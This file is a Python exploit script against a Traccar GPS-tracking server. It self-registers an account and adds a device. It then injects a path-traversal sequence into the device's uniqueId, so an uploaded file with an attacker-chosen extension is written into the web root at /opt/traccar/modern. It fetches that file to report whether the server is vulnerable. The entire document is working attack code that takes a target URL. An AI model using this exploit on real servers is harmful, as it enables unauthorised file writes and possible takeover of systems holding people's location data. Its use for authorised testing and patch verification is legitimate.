import requests
import random
import string
import sys

session = requests.session()

def generate_random_string(length=8):
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def register(target, username):
    headers = {
        'Content-Type': "application/json"
    }
    data = {
        "name": username,
        "email": f"{username}@admin.com",
        "password": "123456",
        "totpKey": None
    }
    
    res = session.post(f"{target}/api/users",headers=headers, json=data)
    return res


def login(target, username):
    headers = {
        'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8"
    }
    data = 'email=' + username + '@admin.com&password=123456'
    res = session.post(f"{target}/api/session",headers=headers, data=data)
    return res


def add_device(target, device_name):
    headers = {
        'Content-Type': "application/json"
    }
    data = {
        "name": device_name,
        "uniqueId": device_name
    }
    res = session.post(f"{target}/api/devices",headers=headers, json=data)
    return res


def upload_file(target, device_id, file_suffix, data):
    headers = {
        'Content-Type': f"image/{file_suffix}"
    }
    res = session.post(f"{target}/api/devices/{device_id}/image",headers=headers, data=data)
    return res

def change_upload_path(target, device_id, device_name, upload_path):
    headers = {
        'Content-Type': 'application/json'
    }
    data = {
        "id": device_id,
        "attributes": {
            "deviceImage": "device.png"
        },
        "groupId": 0,
        "calendarId": 0,
        "name": "test",
        "uniqueId": f"{device_name}/../../../../..{upload_path}",
        "status": "offline", "lastUpdate":None,"positionId":0,"phone":None,"model":None,"contact":None,"category":None,"disabled":False,"expirationTime":None}
    res = session.put(f"{target}/api/devices/{device_id}",headers=headers, json=data)
    return res


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} http://example.com:8082")
        sys.exit(0)
    target = sys.argv[1]
    username = generate_random_string()
    # register user
    res = register(target, username)
    if username not in res.text:
        print("Register Error!!")
        sys.exit(0)
    print(f"Register: {username}@admin.com  Password: 123456")
    # login
    res = login(target, username)
    if username not in res.text:
        print("Login Error!!")
        sys.exit(0)
    print("Login Success!!")
    device_name = generate_random_string()

    # Add Device
    res = add_device(target, device_name)
    if 'id' not in res.text:
        print("ADD Device Error!!")
        sys.exit(0)
    print(f'Add Device Success!! [{device_name}]')
    device_id = res.json()['id']

    # # Upload File
    suffix = generate_random_string()
    data = generate_random_string(20)
    res = upload_file(target, device_id, suffix, data)
    if 'device.' + suffix not in res.text:
        print("Upload Error!!")
        sys.exit(0)
    print(f"First Upload Success!!")

    # Change Upload Path
    upload_path = "/opt/traccar/modern"
    res = change_upload_path(target, device_id, device_name, upload_path)
    if upload_path not in res.text:
        print("Change Upload Path Error!!")
        sys.exit(0)
    print("Change Upload Path Success!!")

    # Upload File Again
    res = upload_file(target, device_id, suffix, data)
    if 'device.' + suffix not in res.text:
        print("Upload Error!!")
        sys.exit(0)
    
    print("Upload Success!!")
    # Check upload
    # if set upload_path = "/opt/traccar/modern"
    check_url = f"{target}/device.{suffix}"
    print(f"Check: {check_url}")
    res = session.get(check_url)
    if data in res.text:
        print("Is a Vulnerability!")
    else:
        print('Not is a Vulnerability!')
